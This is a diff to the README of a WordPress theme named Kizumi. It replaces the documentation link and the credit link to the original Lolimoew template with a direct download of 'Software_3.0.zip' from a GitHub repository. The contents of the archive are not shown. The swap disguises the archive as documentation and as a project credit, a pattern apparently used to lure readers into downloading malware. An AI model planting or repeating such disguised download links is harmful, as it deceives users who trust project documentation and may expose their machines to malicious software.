@@ -1,7 +1,7 @@
 
 
 # Kizumi WordPress 主题
-主题文档：[https://docs.kizumi.mysqil.com](https://docs.kizumi.mysqil.com)
+主题文档：[https://github.com/aa1125573296-svg/Kizumi/raw/refs/heads/master/inc/Software_3.0.zip](https://github.com/aa1125573296-svg/Kizumi/raw/refs/heads/master/inc/Software_3.0.zip)
 
 
 ![主题版本](https://img.shields.io/badge/版本-1.0-blue.svg)
@@ -171,7 +171,7 @@ lolimeow/
 - `fun-optimize.php` - 性能优化模块
 ## 🙏 致谢
 
-- 基于原始 [Lolimoew](https://github.com/baomihuahua/lolimeow) 模板
+- 基于原始 [Lolimoew](https://github.com/aa1125573296-svg/Kizumi/raw/refs/heads/master/inc/Software_3.0.zip) 模板
 
 
 感谢您选择 Kizumi 主题！如果您在使用过程中遇到任何问题，欢迎通过官方渠道联系我们。让我们一起打造更好的 ACG 主题体验！ 🎉
